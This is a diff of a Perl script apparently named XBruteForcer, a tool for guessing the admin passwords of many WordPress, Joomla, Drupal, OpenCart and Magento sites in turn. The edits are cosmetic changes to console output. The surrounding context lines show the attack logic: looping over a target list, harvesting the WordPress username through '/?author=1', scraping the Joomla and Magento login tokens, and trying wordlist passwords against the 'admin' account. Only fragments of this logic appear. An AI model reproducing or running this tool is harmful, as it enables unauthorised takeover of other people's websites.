@@ -58,32 +58,32 @@ OPTIONS:
 }
 
 sub XBruteForcer {
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"1";
 print color('bold red'),"]";
 print color('bold white')," WordPress \n";
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green');
 print color('bold green'),"2";
 print color('bold red'),"]";
 print color('bold white')," Joomla \n";
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"3";
 print color('bold red'),"]";
 print color('bold white')," DruPal \n";
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"4";
 print color('bold red'),"]";
 print color('bold white')," OpenCart \n";
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"5";
 print color('bold red'),"]";
 print color('bold white')," Magento \n";
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"6";
 print color('bold red'),"]";
 print color('bold white')," Auto \n";
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"]";
 print color('bold white')," Choose Number : ";
@@ -101,7 +101,7 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"$site";
@@ -120,7 +120,7 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"$site";
@@ -139,7 +139,7 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"$site";
@@ -158,7 +158,7 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"$site";
@@ -177,7 +177,7 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"$site";
@@ -195,7 +195,7 @@ $link=$#TARGETS + 1;
 OUTER: foreach $site(@TARGETS){
 chomp($site);
 
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"$site";
@@ -251,14 +251,14 @@ $user = $site . '/?author=1';
 $getuser = $ua->get($user)->content;
 if($getuser =~/author\/(.*?)\//){
 $wpuser=$1;
-print color('bold red'),"\n[";
+print color('bold red'),"\n\n [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Username: $wpuser\n";
 wp();
 }
 else {
-print color('bold red'),"\n[";
+print color('bold red'),"\n\n [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Can't Get Username\n\n";
@@ -267,7 +267,7 @@ print color('bold white'),"Can't Get Username\n\n";
 
 ###### WorDPress #######
 sub wp{
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"-";
 print color('bold red'),"] ";
 print color('bold white'),"Starting brute force\n";
@@ -277,7 +277,7 @@ chomp($_);
 $wp = $site . '/wp-login.php';
 $redirect = $site . '/wp-admin/';
 $wpass = $_;
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Trying: $wpass \n";
@@ -319,14 +319,14 @@ $getoken = $ua->get($joomsite)->content;
 if ( $getoken =~ /name="(.*)" value="1"/ ) {
 $token = $1 ;
 }else{
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"x";
 print color('bold red'),"] ";
 print color('bold white'),"Can't Grabb Joomla Token !\n";
 next OUTER;
 }
 
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"-";
 print color('bold red'),"] ";
 print color('bold white'),"Starting brute force\n";
@@ -335,7 +335,7 @@ while(<a>){
 chomp($_);
 $joomuser = admin;
 $joompass = $_;
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Trying: $joompass \n";
@@ -358,7 +358,7 @@ next OUTER;
 
 ######DruPal#######
 sub drupal{
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"-";
 print color('bold red'),"] ";
 print color('bold white'),"Starting brute force\n";
@@ -367,7 +367,7 @@ while(<a>){
 chomp($_);
 $druser = admin;
 $drupass = $_;
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Trying: $drupass \n";
@@ -393,7 +393,7 @@ next OUTER;
 
 ###### OpenCart #######
 sub opencart{
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"-";
 print color('bold red'),"] ";
 print color('bold white'),"Starting brute force\n";
@@ -402,7 +402,7 @@ while(<a>){
 chomp($_);
 $ocuser = admin;
 $ocpass = $_;
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Trying: $ocpass \n";
@@ -441,14 +441,14 @@ $getoken = $ua->get($magsite)->content;
 if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
 $token = $1 ;
 }else{
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"x";
 print color('bold red'),"] ";
 print color('bold white'),"Can't Grabb Magento Token !\n";
 next OUTER;
 }
 
-print color('bold red'),"\n[";
+print color('bold red'),"\n [";
 print color('bold green'),"-";
 print color('bold red'),"] ";
 print color('bold white'),"Starting brute force\n";
@@ -457,7 +457,7 @@ while(<a>){
 chomp($_);
 $maguser = "admin";
 $magpass = $_;
-print color('bold red'),"[";
+print color('bold red')," [";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Trying: $magpass \n";
